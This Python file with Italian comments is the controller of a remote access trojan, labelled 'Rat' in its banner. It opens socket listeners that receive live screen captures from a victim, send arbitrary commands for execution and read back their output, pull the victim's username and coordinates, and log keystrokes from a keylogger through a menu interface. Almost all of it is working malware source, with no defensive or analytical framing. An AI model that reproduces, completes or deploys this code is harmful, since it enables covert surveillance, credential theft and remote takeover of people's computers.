import socket
import cv2
import numpy as np
import struct
import threading
import sys
from datetime import datetime

# Lista per memorizzare i tasti premuti e gli orari
tasti_premuti = []
lock_tasti = threading.Lock()

# Funzione per gestire gli screenshot (aggiornata per gestire la GUI in modo fluido)
def gestisci_screenshot():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('127.0.0.1', 12464))  # Porta per gli screenshot
            s.listen(5)
            print("[📷] In attesa di screenshot...")
            conn, addr = s.accept()
            print(f"[✅] Connessione screenshot stabilita con {addr}")

            try:
                while True:
                    # Ricevi la dimensione dell'immagine
                    image_size_data = conn.recv(4)
                    if not image_size_data or len(image_size_data) != 4:
                        print("[⚠️] Dimensione immagine non ricevuta correttamente.")
                        break

                    image_size = struct.unpack("I", image_size_data)[0]
                    #print(f"[DEBUG] Dimensione immagine attesa: {image_size} byte")

                    # Ricevi i dati dell'immagine
                    image_data = b"" 
                    while len(image_data) < image_size:
                        packet = conn.recv(image_size - len(image_data))
                        if not packet:
                            print("[⚠️] Pacchetto vuoto ricevuto.")
                            break
                        image_data += packet

                    # Decodifica l'immagine
                    image = np.frombuffer(image_data, dtype=np.uint8)
                    frame = cv2.imdecode(image, cv2.IMREAD_COLOR)
                    if frame is not None:
                        cv2.imshow("Desktop Remoto", frame)
                        if cv2.waitKey(1) & 0xFF == ord('q'):
                            print("[🔒] Chiusura della finestra 'Desktop Remoto' richiesta.")
                            break
                    else:
                        print("[⚠️] Errore: immagine non valida.")
            except Exception as e:
                print(f"[❌] Errore nella gestione degli screenshot: {e}")
            finally:
                conn.close()
                cv2.destroyAllWindows()
                print("[🔒] Connessione screenshot chiusa.")
        except Exception as e:
            print(f"[❌] Errore nella connessione per screenshot: {e}")

# Funzione per gestire i comandi
def gestisci_comandi():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('127.0.0.1', 12465))  # Porta per i comandi
        s.listen(5)
        print("[💻] In attesa di connessioni per comandi...")
        conn, addr = s.accept()
        print(f"[✅] Connessione comandi stabilita con {addr}")

        while True:
            try:
                # Invia un comando al client
                comando = input("Inserisci un comando da eseguire (exit per terminare): ")
                conn.send(comando.encode())
                if comando.lower() == "exit":
                    print("[🔒] Connessione chiusa (comandi).")
                    break

                # Ricevi la risposta
                response_size_data = conn.recv(4)
                if not response_size_data:
                    print("[⚠️] Nessuna risposta dal client.")
                    break

                response_size = struct.unpack("I", response_size_data)[0]
                response_data = b"" 
                while len(response_data) < response_size:
                    packet = conn.recv(response_size - len(response_data))
                    if not packet:
                        print("[⚠️] Pacchetto vuoto ricevuto (comandi).")
                        break
                    response_data += packet

                # Decodifica i dati ricevuti come testo
                response = response_data.decode('utf-8', errors='ignore')
                print(f"[🔹] Risposta dal client: {response}")

            except Exception as e:
                print(f"[❌] Errore nella gestione dei comandi: {e}")
                break

        conn.close()
    except Exception as e:
        print(f"[❌] Errore nella connessione per i comandi: {e}")

# Funzione per ottenere informazioni dal client
def ottieni_info_client():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('127.0.0.1', 12466))  # Porta per informazioni sul client
        s.listen(5)
        print("[🔍] In attesa di connessione per informazioni sul client...")
        conn, addr = s.accept()
        print(f"[✅] Connessione informazioni stabilita con {addr}")

        # Invia richiesta di informazioni
        conn.send("get_info".encode())

        # Ricevi la dimensione della risposta
        response_size_data = conn.recv(4)
        if not response_size_data:
            print("[⚠️] Nessuna risposta dal client.")
            return

        response_size = struct.unpack("I", response_size_data)[0]
        response_data = b""
        while len(response_data) < response_size:
            packet = conn.recv(response_size - len(response_data))
            if not packet:
                print("[⚠️] Pacchetto vuoto ricevuto (informazioni).")
                break
            response_data += packet

        # Decodifica la risposta
        response = response_data.decode('utf-8', errors='ignore')
        print(f"[ℹ️] Informazioni ricevute dal client:\n{response}")

        conn.close()
    except Exception as e:
        print(f"[❌] Errore nella connessione per informazioni: {e}")

# Funzione per ricevere i tasti premuti dal client (keylogger)
def gestisci_keylogger():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('127.0.0.1', 12467))  # Porta per i keylogger
        s.listen(5)
        print("[⌨️] In attesa di tasti premuti dal client...")

        conn, addr = s.accept()
        print(f"[✅] Connessione keylogger stabilita con {addr}")

        while True:
            try:
                # Ricevi la dimensione dei dati del tasto
                data_size = conn.recv(4)
                if not data_size:
                    print("[⚠️] Connessione chiusa dal client.")
                    break

                # Decodifica la dimensione
                size = struct.unpack("I", data_size)[0]
                data = b""

                # Ricevi i dati del tasto
                while len(data) < size:
                    packet = conn.recv(size - len(data))
                    if not packet:
                        print("[⚠️] Pacchetto vuoto ricevuto (keylogger).")
                        break
                    data += packet

                # Decodifica il tasto ricevuto
                tasto = data.decode('utf-8')
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                # Aggiungi il tasto alla lista protetta da lock
                with lock_tasti:
                    tasti_premuti.append((timestamp, tasto))

            except Exception as e:
                print(f"[❌] Errore durante la ricezione dei tasti: {e}")
                break

        conn.close()
    except Exception as e:
        print(f"[❌] Errore nella connessione keylogger: {e}")

# Funzione per visualizzare i tasti raccolti
def visualizza_tasti():
    with lock_tasti:
        if not tasti_premuti:
            print("[ℹ️] Nessun tasto premuto ricevuto finora.")
        else:
            print("\n[⌨️] Tasti premuti ricevuti:")
            for timestamp, tasto in tasti_premuti:
                print(f"[{timestamp}] {tasto}")

# Menu principale
def menu_principale():
    ascii_art = r"""
                                                            
RRRRRRRRRRRRRRRRR                             tttt          
R::::::::::::::::R                         ttt:::t          
R::::::RRRRRR:::::R                        t:::::t          
RR:::::R     R:::::R                       t:::::t          
  R::::R     R:::::R  aaaaaaaaaaaaa  ttttttt:::::ttttttt    
  R::::R     R:::::R  a::::::::::::a t:::::::::::::::::t    
  R::::RRRRRR:::::R   aaaaaaaaa:::::at:::::::::::::::::t    
  R:::::::::::::RR             a::::atttttt:::::::tttttt    
  R::::RRRRRR:::::R     aaaaaaa:::::a      t:::::t          
  R::::R     R:::::R  aa::::::::::::a      t:::::t          
  R::::R     R:::::R a::::aaaa::::::a      t:::::t          
  R::::R     R:::::Ra::::a    a:::::a      t:::::t    tttttt
RR:::::R     R:::::Ra::::a    a:::::a      t::::::tttt:::::t
R::::::R     R:::::Ra:::::aaaa::::::a      tt::::::::::::::t
R::::::R     R:::::R a::::::::::aa:::a       tt:::::::::::tt
RRRRRRRR     RRRRRRR  aaaaaaaaaa  aaaa         ttttttttttt  
                                                            
    """
    print(ascii_art)

    print("\nBenvenuto nel Server!")
    print("[1] Avvia gestione screenshot")
    print("[2] Avvia gestione comandi")
    print("[3] Ottenere informazioni dal client (nome utente, coordinate)")
    print("[4] Avvia keylogger (Ricevi i tasti premuti dal client)")
    print("[5] Visualizza tasti premuti")
    print("[6] Esci\n")
    scelta = input("Scegli un'opzione: ")
    return scelta

# Funzione principale per avviare il server
def avvia_server():
    try:
        while True:
            scelta = menu_principale()
            if scelta == "1":
                print("[📷] Avvio gestione screenshot...")
                threading.Thread(target=gestisci_screenshot, daemon=True).start()
            elif scelta == "2":
                print("[💻] Avvio gestione comandi...")
                gestisci_comandi()  # Chiamata diretta per rimanere nella gestione comandi
            elif scelta == "3":
                print("[🔍] Ottenimento informazioni dal client...")
                ottieni_info_client()  # Ottenere informazioni
            elif scelta == "4":
                print("[⌨️] Avvio gestione keylogger...")
                threading.Thread(target=gestisci_keylogger, daemon=True).start()  # Avvia keylogger
            elif scelta == "5":
                visualizza_tasti()  # Visualizza i tasti premuti
            elif scelta == "6":
                print("[👋] Uscita dal server. Arrivederci!")
                sys.exit(0)
            else:
                print("[⚠️] Opzione non valida. Riprova.")
    except KeyboardInterrupt:
        print("\n[🔒] Server interrotto manualmente. Arrivederci!")
        sys.exit(0)

# Avvia il server
if __name__ == "__main__":
    avvia_server()
